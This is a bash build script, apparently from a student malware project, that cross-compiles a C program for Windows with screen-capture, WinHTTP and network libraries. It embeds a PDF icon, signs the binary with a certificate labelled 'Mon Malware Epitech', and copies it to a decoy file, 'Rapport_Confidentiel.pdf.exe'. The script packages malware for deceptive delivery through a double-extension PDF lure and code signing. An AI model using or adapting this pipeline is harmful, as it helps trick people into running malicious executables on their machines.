#!/bin/bash

set -e

SOURCE_FILE="${1:-first.c}"

if [ ! -f "$SOURCE_FILE" ]; then
    echo "Erreur: Le fichier '$SOURCE_FILE' n'existe pas"
    exit 1
fi

BASENAME=$(basename "$SOURCE_FILE" .c)
SOURCE_DIR=$(dirname "$SOURCE_FILE")

OUTPUT_EXE="${SOURCE_DIR}/${BASENAME}.exe"
SIGNED_EXE="${SOURCE_DIR}/${BASENAME}_signed.exe"

echo "Compilation de '$SOURCE_FILE'..."
echo "Nettoyage des anciens fichiers..."
rm -f "$OUTPUT_EXE" "$SIGNED_EXE"

echo "Compilation avec mingw32..."

ADDITIONAL_SOURCES=""

if grep -q "#include \"system_info.h\"" "$SOURCE_FILE" 2>/dev/null; then
    SYSTEM_INFO_C="${SOURCE_DIR}/system_info.c"
    if [ -f "$SYSTEM_INFO_C" ]; then
        echo "Détection de system_info.h - ajout de system_info.c à la compilation"
        ADDITIONAL_SOURCES="$SYSTEM_INFO_C"
    fi
fi

EXTRA_LIBS=""
if grep -q "BitBlt\|GetDC\|CreateCompatibleDC\|GetDIBits" "$SOURCE_FILE" 2>/dev/null; then
    echo "Détection de GDI32 - ajout de -lgdi32 -luser32"
    EXTRA_LIBS="-lgdi32 -luser32"
fi

#SUBSYSTEM_FLAG=""
#if grep -q "SUBSYSTEM:windows" "$SOURCE_FILE" 2>/dev/null; then
#    echo "Détection de SUBSYSTEM:windows - ajout de -mwindows"
#    SUBSYSTEM_FLAG="-mwindows"
#fi

RESOURCE_OBJ=""
RC_FILE="${SOURCE_DIR}/resource.rc"
ICON_FILE="${SOURCE_DIR}/pdf_icon.ico"
if [ -f "$RC_FILE" ] && [ -f "$ICON_FILE" ]; then
    echo "Détection de resource.rc + pdf_icon.ico - compilation des ressources"
    x86_64-w64-mingw32-windres "$RC_FILE" -O coff -o "${SOURCE_DIR}/resource.o"
    RESOURCE_OBJ="${SOURCE_DIR}/resource.o"
fi

WINHTTP_FLAG=""
if grep -q "winhttp.h\|WinHttpOpen" "$SOURCE_FILE" 2>/dev/null; then
    echo "Détection de WinHTTP - ajout de -lwinhttp"
    WINHTTP_FLAG="-lwinhttp"
fi

x86_64-w64-mingw32-gcc "$SOURCE_FILE" $ADDITIONAL_SOURCES $RESOURCE_OBJ -o "$OUTPUT_EXE" -s -liphlpapi -lws2_32 -lrpcrt4 $EXTRA_LIBS $SUBSYSTEM_FLAG $WINHTTP_FLAG

echo "Signature du binaire..."
osslsigncode sign -pkcs12 MalwrCert.pfx -n "Mon Malware Epitech" -i http://www.epitech.eu -t http://timestamp.digicert.com -in "$OUTPUT_EXE" -out "$SIGNED_EXE"

PDF_EXE="${SOURCE_DIR}/Rapport_Confidentiel.pdf.exe"
cp "$SIGNED_EXE" "$PDF_EXE"

echo "✓ Compilation et signature terminées avec succès!"
echo "  - Exécutable: $OUTPUT_EXE"
echo "  - Signé:      $SIGNED_EXE"
echo "  - PDF leurre: $PDF_EXE"
